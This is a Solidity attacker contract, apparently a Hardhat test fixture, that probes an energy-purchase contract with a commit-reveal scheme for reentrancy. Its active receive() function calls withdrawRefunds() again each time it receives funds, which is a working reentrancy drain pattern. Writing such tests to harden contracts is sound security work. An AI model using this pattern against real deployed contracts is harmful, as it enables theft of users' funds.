// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "hardhat/console.sol";

interface IEnergyContract {
    function commitPurchase(bytes32 _commitmentHash) external;

    function revealPurchase(uint256 _kWh, uint256 _nonce) external payable;

    function withdrawRefunds() external;
}

contract MaliciousContract {
    IEnergyContract public energyContract;
    bool private attacking;

    constructor(address _energyContract) {
        energyContract = IEnergyContract(_energyContract);
    }

    function commitPurchase(bytes32 _commitmentHash) external {
        console.log(
            "Committing purchase with hash:",
            bytes32ToString(_commitmentHash)
        );
        energyContract.commitPurchase(_commitmentHash);
    }

    function attackRevealPurchase(
        uint256 _kWh,
        uint256 _nonce
    ) external payable {
        console.log(
            "attackRevealPurchase called with kWh: %d, nonce: %d, value: %d",
            _kWh,
            _nonce,
            msg.value
        );
        attacking = true;
        energyContract.revealPurchase{value: msg.value}(_kWh, _nonce);
    }

    function attackWithdrawRefunds() external {
        console.log("attackWithdrawRefunds called by:", msg.sender);
        attacking = true;
        energyContract.withdrawRefunds();
    }

    // receive() external payable {
    //     console.log("Receive called with value:", msg.value);
    //     if (attacking) {
    //         console.log("Attempting reentrancy on withdrawRefunds");
    //         try energyContract.withdrawRefunds() {
    //             console.log("Reentrancy succeeded unexpectedly");
    //         } catch {
    //             console.log("Reentrancy failed as expected");
    //         }
    //     }
    // }

    receive() external payable {
        console.log("Receive called with value:", msg.value);
        if (attacking) {
            console.log("Attempting reentrancy on withdrawRefunds");
            energyContract.withdrawRefunds();
        }
    }

    function bytes32ToString(
        bytes32 _bytes32
    ) internal pure returns (string memory) {
        bytes memory hexString = new bytes(66);
        hexString[0] = "0";
        hexString[1] = "x";
        bytes memory hexChars = "0123456789abcdef";
        for (uint256 i = 0; i < 32; i++) {
            uint8 highNibble = uint8(_bytes32[i] >> 4);
            uint8 lowNibble = uint8(_bytes32[i] & 0x0f);
            hexString[2 + i * 2] = hexChars[highNibble];
            hexString[3 + i * 2] = hexChars[lowNibble];
        }
        return string(hexString);
    }
}
